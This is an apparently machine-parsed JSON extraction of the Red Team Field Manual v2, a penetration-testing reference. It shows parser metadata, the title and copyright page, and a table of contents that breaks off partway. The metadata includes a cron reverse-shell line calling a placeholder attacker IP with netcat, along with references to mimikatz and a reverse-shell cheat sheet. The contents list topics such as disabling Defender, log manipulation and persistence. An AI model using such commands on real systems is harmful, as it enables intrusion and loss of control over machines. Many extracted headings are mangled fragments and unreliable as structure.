{
  "document_type": "structured_text",
  "metadata": {
    "total_blocks": 4164,
    "block_types": {
      "paragraph": 3487,
      "code_block": 597,
      "list": 4,
      "heading": 74,
      "quote": 2
    },
    "headings": [
      {
        "title": "with 12 0's is a day in epoch (1000000000000). Add or subtract to adjust dsquery filter",
        "level": 1,
        "number": "1"
      },
      {
        "title": "0 * * * nc <ATTACKER_IP> <ATTACKER_PORT> -e /bin/sh",
        "level": 1,
        "number": "0"
      },
      {
        "title": "This script bans any IP in the /24 subnet for 192.168.1.0 starting at 2",
        "level": 1
      },
      {
        "title": "It assumes 1 is the router and does not ban IPs .20, .21, .22",
        "level": 1
      },
      {
        "title": "od 700 /root/.ssh",
        "level": 1,
        "number": null
      },
      {
        "title": "od 600 /root/.ssh/authorized_keys",
        "level": 1,
        "number": null
      },
      {
        "title": "– 127.255.255.255",
        "level": 4,
        "number": "0.0.0.0"
      },
      {
        "title": "– 191.255.255.255",
        "level": 4,
        "number": "128.0.0.0"
      },
      {
        "title": "– 223.255.255.255",
        "level": 4,
        "number": "192.0.0.0"
      },
      {
        "title": "– 239.255.255.255",
        "level": 4,
        "number": "224.0.0.0"
      },
      {
        "title": "– 255.255.255.255",
        "level": 4,
        "number": "240.0.0.0"
      },
      {
        "title": "– 10.255.255.255",
        "level": 4,
        "number": "10.0.0.0"
      },
      {
        "title": "– 172.31.255.255",
        "level": 4,
        "number": "172.16.0.0"
      },
      {
        "title": "- 192.168.255.255",
        "level": 4,
        "number": "192.168.0.0"
      },
      {
        "title": "– 127.255.255.255",
        "level": 4,
        "number": "127.0.0.0"
      },
      {
        "title": "Useable Hosts",
        "level": 1,
        "number": "0"
      },
      {
        "title": "Hosts",
        "level": 1,
        "number": "2"
      },
      {
        "title": "Hosts",
        "level": 1,
        "number": "6"
      },
      {
        "title": "Hosts",
        "level": 1,
        "number": "14"
      },
      {
        "title": "Hosts",
        "level": 1,
        "number": "30"
      },
      {
        "title": "Hosts",
        "level": 1,
        "number": "62"
      },
      {
        "title": "Hosts",
        "level": 1,
        "number": "126"
      },
      {
        "title": "Hosts",
        "level": 1,
        "number": "254"
      },
      {
        "title": "Hosts",
        "level": 1,
        "number": "510"
      },
      {
        "title": "Hosts",
        "level": 1,
        "number": "1022"
      },
      {
        "title": "Hosts",
        "level": 1,
        "number": "2046"
      },
      {
        "title": "Hosts",
        "level": 1,
        "number": "4094"
      },
      {
        "title": "Hosts",
        "level": 1,
        "number": "8190"
      },
      {
        "title": "Hosts",
        "level": 1,
        "number": "16382"
      },
      {
        "title": "Hosts",
        "level": 1,
        "number": "32766"
      },
      {
        "title": "Hosts",
        "level": 1,
        "number": "65534"
      },
      {
        "title": "Hosts",
        "level": 1,
        "number": "131070"
      },
      {
        "title": "Hosts",
        "level": 1,
        "number": "262142"
      },
      {
        "title": "Hosts",
        "level": 1,
        "number": "524286"
      },
      {
        "title": "Hosts",
        "level": 1,
        "number": "1048574"
      },
      {
        "title": "Hosts",
        "level": 1,
        "number": "2097150"
      },
      {
        "title": "Hosts",
        "level": 1,
        "number": "4194302"
      },
      {
        "title": "Hosts",
        "level": 1,
        "number": "8388606"
      },
      {
        "title": "Hosts",
        "level": 1,
        "number": "16777214"
      },
      {
        "title": "– 240 = 16 = subnet ranges of 16, i.e.",
        "level": 1,
        "number": "256"
      },
      {
        "title": "configure terminal",
        "level": 1
      },
      {
        "title": "MHz (HF)",
        "level": 2,
        "number": "13.56"
      },
      {
        "title": "MHz (N. Am)",
        "level": 1,
        "number": "315"
      },
      {
        "title": "MHz (Europe,Asia)",
        "level": 2,
        "number": "433.92"
      },
      {
        "title": "Mhz - L1 Band",
        "level": 2,
        "number": "1176.45"
      },
      {
        "title": "Mhz - L2 Band",
        "level": 2,
        "number": "1227.60"
      },
      {
        "title": "MHz - L5 Band",
        "level": 2,
        "number": "1575.42"
      },
      {
        "title": "MHz (Europe)",
        "level": 1,
        "number": "868"
      },
      {
        "title": "MHz (US,Australia)",
        "level": 1,
        "number": "915"
      },
      {
        "title": "GHz (worldwide)",
        "level": 2,
        "number": "2.4"
      },
      {
        "title": "(ZigBee)",
        "level": 3,
        "number": "802.15.4"
      },
      {
        "title": "(Bluetooth)",
        "level": 3,
        "number": "802.15.1"
      },
      {
        "title": "GHz",
        "level": 2,
        "number": "2.4"
      },
      {
        "title": "GHz",
        "level": 2,
        "number": "5.0"
      },
      {
        "title": "management frame",
        "level": 2,
        "number": "802.11"
      },
      {
        "title": "control frame",
        "level": 2,
        "number": "802.11"
      },
      {
        "title": "data frame",
        "level": 2,
        "number": "802.11"
      },
      {
        "title": "association request",
        "level": 2,
        "number": "802.11"
      },
      {
        "title": "reassociation request",
        "level": 2,
        "number": "802.11"
      },
      {
        "title": "probe request",
        "level": 2,
        "number": "802.11"
      },
      {
        "title": "beacon",
        "level": 2,
        "number": "802.11"
      },
      {
        "title": "disassociate",
        "level": 2,
        "number": "802.11"
      },
      {
        "title": "authenticate",
        "level": 2,
        "number": "802.11"
      },
      {
        "title": "or more",
        "level": 1,
        "number": "0"
      },
      {
        "title": "or more",
        "level": 1,
        "number": "1"
      },
      {
        "title": "or 1",
        "level": 1,
        "number": "0"
      },
      {
        "title": "or more",
        "level": 1,
        "number": "3"
      },
      {
        "title": "to 5",
        "level": 1,
        "number": "3"
      },
      {
        "title": "or 5",
        "level": 1,
        "number": "3"
      },
      {
        "title": "or 4 or 5",
        "level": 1,
        "number": "3"
      },
      {
        "title": "or more digits",
        "level": 1,
        "number": "3"
      },
      {
        "title": "Create SSL cert (follow prompts for customization)",
        "level": 1
      },
      {
        "title": "openssl req -new -x509 -keyout cert.pem -out cert.pem -days 365 –nodes",
        "level": 1
      },
      {
        "title": "Create httpserver.py",
        "level": 1
      }
    ],
    "code_languages": [
      "shell"
    ],
    "urls": [
      "http://bit.ly/nuc0N0",
      "http://www.radioreference.com/apps/db/",
      "http://www.willhackforsushi.com/papers/80211_Pocket_Reference_Guide.pdf",
      "https://apps.fcc.gov/oetcf/eas/reports/GenericSearch.cfm",
      "https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-mimikatz",
      "https://cdn.comparitech.com/wp-content/uploads/2019/06/Metasploit-Cheat-Sheet-1.webp",
      "https://crontab.guru/",
      "https://danielmiessler.com/study/tcpdump/",
      "https://edzeame.wordpress.com/2014/06/23/setting-up-stunnel-configurations/",
      "https://github.com/GhostPack/SharpUp",
      "https://github.com/ITI/ICS-Security-Tools/blob/master/protocols/PORTS.md",
      "https://github.com/byt3bl33d3r/WitnessMe",
      "https://github.com/darkoperator/dnsrecon",
      "https://github.com/lanmaster53/recon-ng",
      "https://github.com/vanhauser-thc/thc-ipv6",
      "https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet",
      "https://technet.microsoft.com/en-us/sysinternals/",
      "https://www.stationx.net/wireshark-cheat-sheet/"
    ],
    "file_paths": [
      "./stunnel.conf",
      ".tar.bz2",
      ".tar.gz",
      "/.bash_h",
      "/.ssh",
      "//apps.fcc.gov/oetcf/eas/reports/GenericSearch.cfm",
      "//bit.ly",
      "//book.hacktricks.xyz",
      "//cdn.comparitech.com/wp-content/uploads/2019/06/Metasploit-Cheat-Sheet-1.webp",
      "//crontab.guru",
      "//danielmiessler.com",
      "//edzeame.wordpress.com",
      "//github.com",
      "//github.com/ITI/ICS-Security-Tools/blob/master/protocols/PORTS.md",
      "//pentestmonkey.net",
      "//technet.microsoft.com",
      "//www.radioreference.com",
      "//www.stationx.net",
      "//www.willhackforsushi.com/papers/80211_Pocket_Reference_Guide.pdf",
      "/etc/apt/sources.list",
      "/etc/init.d",
      "/etc/login.defs",
      "/etc/proxychains.conf",
      "/etc/rc.d",
      "/etc/rc.local",
      "/etc/resolv.conf",
      "/etc/stunnel/stunnel.pem",
      "/stunnel.conf",
      "/usr/share/wordlists/rockyou.txt",
      "/var/log/apache2/access.log",
      "/var/log/auth.log",
      "0.0.0.0",
      "1.0",
      "1.0.0.1",
      "1.1.1.0",
      "1.1.1.1",
      "1.1.1.101",
      "1.1.1.111",
      "1.1.1.96",
      "1.2.3.0",
      "10.0",
      "10.0.4",
      "10.1.5",
      "10.10.5",
      "10.10.50.1",
      "10.10.50.100",
      "10.11.6",
      "10.12.6",
      "10.13.6",
      "10.14.6",
      "10.15.7",
      "10.2.8",
      "10.3.9",
      "10.4.11",
      "10.5.8",
      "10.6.8",
      "10.7.5",
      "10.8.5",
      "10.9.5",
      "11.6.7",
      "12.4",
      "127.0.0.1",
      "172.16.1.10",
      "18-26.5",
      "192.168.1",
      "192.168.1.1",
      "192.168.1.2",
      "192.168.1.22",
      "192.168.3",
      "2.0",
      "2.2.2.2",
      "2.4-2.483.5",
      "2.4/5.0",
      "2022.2",
      "20Test.html",
      "22.04",
      "255.0.0.0",
      "255.128.0.0",
      "255.192.0.0",
      "255.224.0.0",
      "255.240.0.0",
      "255.248.0.0",
      "255.252.0.0",
      "255.254.0.0",
      "255.255.0.0",
      "255.255.128.0",
      "255.255.192.0",
      "255.255.224.0",
      "255.255.240.0",
      "255.255.248.0",
      "255.255.252.0",
      "255.255.254.0",
      "255.255.255.0",
      "255.255.255.128",
      "255.255.255.192",
      "255.255.255.224",
      "255.255.255.240",
      "255.255.255.248",
      "255.255.255.252",
      "255.255.255.254",
      "26.5",
      "3.1",
      "3.3.3.0",
      "3.3.3.3",
      "3.5",
      "3.50",
      "3.51",
      "4.0",
      "5.0",
      "5.1",
      "5.2",
      "6.0",
      "6.1",
      "6.2",
      "6.3",
      "802.11a",
      "802.11b",
      "802.11n",
      "Domains.txt",
      "Files\\\\test.exe",
      "Files\\binary.exe",
      "Net.exe",
      "WptsExtensions.dll",
      "\\System32\\config\\AppEvent.Evt",
      "\\System32\\config\\SecEvent.Evt",
      "\\Windows\\Sysnative\\upnpcont.exe",
      "\\pagefile.sys",
      "\\users\\administrator\\desktop\\extractedFile.txt",
      "\\windows\\system32\\wups.exe",
      "\\windows\\temp\\silverlight1.log",
      "\\windows\\temp\\silverlight_compressed.zip",
      "_www._tcp",
      "a.b.c.d",
      "afrinic.net",
      "apnic.net",
      "at.exe",
      "auth.log",
      "bgp4.as",
      "cb.sh",
      "centralops.net",
      "cmd.exe",
      "control.exe",
      "cracked.txt",
      "data.dmp",
      "devmgmt.msc",
      "diskmgmt.msc",
      "dnsrecon.py",
      "dnsstuff.com",
      "docker.io",
      "encoded.exe",
      "eth.addr",
      "eth.dst",
      "eth.src",
      "ettercap.exe",
      "eventvwr.msc",
      "exploit-db.com",
      "extractedHash.txt",
      "file.ef",
      "file.hex",
      "filter.ef",
      "fpipe.exe",
      "ftp.txt",
      "github.com",
      "gpedit.msc",
      "http.authba",
      "http.cookie",
      "http.file_d",
      "http.refere",
      "http.server",
      "http.server.Simple",
      "http.user_a",
      "http.www_au",
      "i.e",
      "iana.com",
      "iana.org",
      "icann.org",
      "id_rsa.pub",
      "intelius.com",
      "internic.net",
      "ip.addr",
      "ip.dst",
      "ip.src",
      "ipv6.addr",
      "ipv6.dst",
      "ipv6.src",
      "keys.pgp",
      "lacnic.net",
      "lg.he.net",
      "lusrmgr.msc",
      "malicous.dll",
      "maltego.com",
      "master..xp_cmd",
      "mimikatz.exe",
      "mount.cifs",
      "multi-user.target",
      "mxtoolbox.com/NetworkTools.aspx",
      "ncpa.cpl",
      "nder\\MpCmdRun.exe",
      "network-tools.com",
      "network.target",
      "nro.net",
      "office2john.py",
      "onstrat.com",
      "opts.iprang",
      "out.ef",
      "out.xml",
      "pagefile.sys",
      "peekyou.com",
      "pipl.com",
      "powershell.exe",
      "publicrecords.searchsystems.net",
      "rc.local",
      "received.txt",
      "regedit.exe",
      "reverse.elf",
      "rip.auth.passwd",
      "ripe.net",
      "s.close",
      "sc.exe",
      "schtasks.exe",
      "secpol.msc",
      "security.hive",
      "securitysift.com",
      "services.msc",
      "shell.evilexample.com",
      "shodan.io",
      "silverlight_compressed.zip",
      "spokeo.com",
      "sqlmap.py",
      "string.printa",
      "stunnel.pem",
      "system.example.com",
      "taskmgr.exe",
      "tcp.dstpor",
      "tcp.flags.ack",
      "tcp.flags.fin",
      "tcp.flags.push",
      "tcp.flags.reset",
      "tcp.flags.syn",
      "tcp.flags.urg",
      "tcp.port",
      "tcp.srcpor",
      "tree.com",
      "udp.dstpor",
      "udp.port",
      "udp.srcpor",
      "user32.dll",
      "viz.greynoise.io",
      "vulnerabilityassessment.co.uk",
      "wlan.fc.type",
      "wlan.fc.type_s",
      "wpa-psk.conf",
      "ws.arin.net",
      "www.theRTFM.com"
    ],
    "has_tables": false,
    "has_figures": false,
    "has_equations": false,
    "structure": [
      {
        "title": "with 12 0's is a day in epoch (1000000000000). Add or subtract to adjust dsquery filter",
        "level": 1,
        "subsections": []
      },
      {
        "title": "0 * * * nc <ATTACKER_IP> <ATTACKER_PORT> -e /bin/sh",
        "level": 1,
        "subsections": []
      },
      {
        "title": "This script bans any IP in the /24 subnet for 192.168.1.0 starting at 2",
        "level": 1,
        "subsections": []
      },
      {
        "title": "It assumes 1 is the router and does not ban IPs .20, .21, .22",
        "level": 1,
        "subsections": []
      },
      {
        "title": "od 700 /root/.ssh",
        "level": 1,
        "subsections": []
      },
      {
        "title": "od 600 /root/.ssh/authorized_keys",
        "level": 1,
        "subsections": [
          {
            "title": "– 127.255.255.255",
            "level": 4,
            "subsections": []
          },
          {
            "title": "– 191.255.255.255",
            "level": 4,
            "subsections": []
          },
          {
            "title": "– 223.255.255.255",
            "level": 4,
            "subsections": []
          },
          {
            "title": "– 239.255.255.255",
            "level": 4,
            "subsections": []
          },
          {
            "title": "– 255.255.255.255",
            "level": 4,
            "subsections": []
          },
          {
            "title": "– 10.255.255.255",
            "level": 4,
            "subsections": []
          },
          {
            "title": "– 172.31.255.255",
            "level": 4,
            "subsections": []
          },
          {
            "title": "- 192.168.255.255",
            "level": 4,
            "subsections": []
          },
          {
            "title": "– 127.255.255.255",
            "level": 4,
            "subsections": []
          }
        ]
      },
      {
        "title": "Useable Hosts",
        "level": 1,
        "subsections": []
      },
      {
        "title": "Hosts",
        "level": 1,
        "subsections": []
      },
      {
        "title": "Hosts",
        "level": 1,
        "subsections": []
      },
      {
        "title": "Hosts",
        "level": 1,
        "subsections": []
      },
      {
        "title": "Hosts",
        "level": 1,
        "subsections": []
      },
      {
        "title": "Hosts",
        "level": 1,
        "subsections": []
      },
      {
        "title": "Hosts",
        "level": 1,
        "subsections": []
      },
      {
        "title": "Hosts",
        "level": 1,
        "subsections": []
      },
      {
        "title": "Hosts",
        "level": 1,
        "subsections": []
      },
      {
        "title": "Hosts",
        "level": 1,
        "subsections": []
      },
      {
        "title": "Hosts",
        "level": 1,
        "subsections": []
      },
      {
        "title": "Hosts",
        "level": 1,
        "subsections": []
      },
      {
        "title": "Hosts",
        "level": 1,
        "subsections": []
      },
      {
        "title": "Hosts",
        "level": 1,
        "subsections": []
      },
      {
        "title": "Hosts",
        "level": 1,
        "subsections": []
      },
      {
        "title": "Hosts",
        "level": 1,
        "subsections": []
      },
      {
        "title": "Hosts",
        "level": 1,
        "subsections": []
      },
      {
        "title": "Hosts",
        "level": 1,
        "subsections": []
      },
      {
        "title": "Hosts",
        "level": 1,
        "subsections": []
      },
      {
        "title": "Hosts",
        "level": 1,
        "subsections": []
      },
      {
        "title": "Hosts",
        "level": 1,
        "subsections": []
      },
      {
        "title": "Hosts",
        "level": 1,
        "subsections": []
      },
      {
        "title": "Hosts",
        "level": 1,
        "subsections": []
      },
      {
        "title": "Hosts",
        "level": 1,
        "subsections": []
      },
      {
        "title": "– 240 = 16 = subnet ranges of 16, i.e.",
        "level": 1,
        "subsections": []
      },
      {
        "title": "configure terminal",
        "level": 1,
        "subsections": [
          {
            "title": "MHz (HF)",
            "level": 2,
            "subsections": []
          }
        ]
      },
      {
        "title": "MHz (N. Am)",
        "level": 1,
        "subsections": [
          {
            "title": "MHz (Europe,Asia)",
            "level": 2,
            "subsections": []
          },
          {
            "title": "Mhz - L1 Band",
            "level": 2,
            "subsections": []
          },
          {
            "title": "Mhz - L2 Band",
            "level": 2,
            "subsections": []
          },
          {
            "title": "MHz - L5 Band",
            "level": 2,
            "subsections": []
          }
        ]
      },
      {
        "title": "MHz (Europe)",
        "level": 1,
        "subsections": []
      },
      {
        "title": "MHz (US,Australia)",
        "level": 1,
        "subsections": [
          {
            "title": "GHz (worldwide)",
            "level": 2,
            "subsections": [
              {
                "title": "(ZigBee)",
                "level": 3,
                "subsections": []
              },
              {
                "title": "(Bluetooth)",
                "level": 3,
                "subsections": []
              }
            ]
          },
          {
            "title": "GHz",
            "level": 2,
            "subsections": []
          },
          {
            "title": "GHz",
            "level": 2,
            "subsections": []
          },
          {
            "title": "management frame",
            "level": 2,
            "subsections": []
          },
          {
            "title": "control frame",
            "level": 2,
            "subsections": []
          },
          {
            "title": "data frame",
            "level": 2,
            "subsections": []
          },
          {
            "title": "association request",
            "level": 2,
            "subsections": []
          },
          {
            "title": "reassociation request",
            "level": 2,
            "subsections": []
          },
          {
            "title": "probe request",
            "level": 2,
            "subsections": []
          },
          {
            "title": "beacon",
            "level": 2,
            "subsections": []
          },
          {
            "title": "disassociate",
            "level": 2,
            "subsections": []
          },
          {
            "title": "authenticate",
            "level": 2,
            "subsections": []
          }
        ]
      },
      {
        "title": "or more",
        "level": 1,
        "subsections": []
      },
      {
        "title": "or more",
        "level": 1,
        "subsections": []
      },
      {
        "title": "or 1",
        "level": 1,
        "subsections": []
      },
      {
        "title": "or more",
        "level": 1,
        "subsections": []
      },
      {
        "title": "to 5",
        "level": 1,
        "subsections": []
      },
      {
        "title": "or 5",
        "level": 1,
        "subsections": []
      },
      {
        "title": "or 4 or 5",
        "level": 1,
        "subsections": []
      },
      {
        "title": "or more digits",
        "level": 1,
        "subsections": []
      },
      {
        "title": "Create SSL cert (follow prompts for customization)",
        "level": 1,
        "subsections": []
      },
      {
        "title": "openssl req -new -x509 -keyout cert.pem -out cert.pem -days 365 –nodes",
        "level": 1,
        "subsections": []
      },
      {
        "title": "Create httpserver.py",
        "level": 1,
        "subsections": []
      }
    ]
  },
  "content_blocks": [
    {
      "type": "paragraph",
      "content": "RTFM",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Red Team Field Manual",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Version 2.0",
      "level": 0,
      "metadata": {
        "file_paths": [
          "2.0"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Ben Clark",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Nick Downer",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "www.theRTFM.com",
      "level": 0,
      "metadata": {
        "file_paths": [
          "www.theRTFM.com"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "@redteamfieldman",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "RTFM v2. Copyright © 2022 by Ben Clark and Nick Downer",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "All rights reserved. No part of this work may be reproduced or transmitted in any form or by any means, without prior written permission of the copyright owner.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ISBN: 9781075091834",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Technical Editor: Mike Mangrum",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Product and company names mentioned herein may be the trademarks of their respective owners. Rather than use a trademark symbol with every occurrence of a trademarked name, the author uses the names only in an editorial fashion, with no intention of infringement of the trademark. Use of a term in this book should not be regarded as affecting the validity of any trademark or service mark.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "The information in this book is distributed \"as is\". While every precaution was taken to ensure the accuracy of the material, the author assumes no responsibility or liability for errors or omissions, or for damages resulting from the use of the information contained herein",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Table of Contents",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Using the Red Team Field Manual (RTFM)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "RTFM How-To",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Open Source Intelligence (OSINT)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Network",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Network Resources",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "WHOIS Resources",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "OSINT Resources",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Relationship and Recon Tools",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Google Searches",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "People Search",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "OSINT Websites",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows OS Details",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows 10 & 11 Versions",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows Server Versions",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows “NT” Versions",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows Administrative Binaries",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Environment Variables",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows Key Files & Locations",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Registry Run Keys",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Registry Run Keys Cont",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows System Enumeration",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows Situational Awareness",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Operating System Information",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Process & Service Enumeration",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows Account Enumeration",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Network Info & Configuration",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Registry Commands & Important Keys",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Remote System Enumeration",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Data Mining Windows",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "File Info & Searching",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Tree Filesystem to Searchable File",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Using Volume Shadow Service (VSS)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Remote Execution",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "sc.exe Remote Execution",
      "level": 0,
      "metadata": {
        "file_paths": [
          "sc.exe"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "MMC COM Object",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Remote Schtasks Execution",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows Active Directory",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Domain and User Enumeration",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Domain Enumeration with Net.exe",
      "level": 0,
      "metadata": {
        "file_paths": [
          "Net.exe"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Domain Enumeration with DSQuery",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Domain Enumeration with DSQuery Cont",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Finding User System in a Windows Domain",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows [Re]Configuration",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Remote Desktop Protocol (RDP) Configuration",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Misc [Re]Configuration",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Disable WIndows Defender",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows Event Viewer Manipulation",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "User Level Persistence",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Scheduled Task User Persistence",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Run Key User Persistence",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Startup Directories",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "at.exe Schedule (WinXP)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Poisoning Existing scripts",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "System Level Persistence",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Schtasks on Boot",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Service Creation",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Windows 10 .DLL Hijack (WPTSEXTENSIONS)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows Scripting",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "PowerShell Scripting",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Powershell Basics",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Powershell OneLiners",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Powershell OneLiners Cont",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows Batch Scripting",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Batch Scripts",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Batch Scripts Cont",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Post Exploitation",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Mimikatz Credential Manipulation",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows Privilege Escalation Checklist",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "File System Redirection",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
